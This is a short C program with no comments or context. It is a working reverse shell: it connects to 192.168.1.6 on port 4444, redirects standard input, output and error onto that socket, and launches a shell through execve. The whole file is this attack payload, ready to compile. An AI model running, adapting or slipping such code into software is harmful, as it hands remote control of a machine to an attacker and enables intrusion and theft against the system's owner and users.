#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444); 
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.6");

    connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;
}

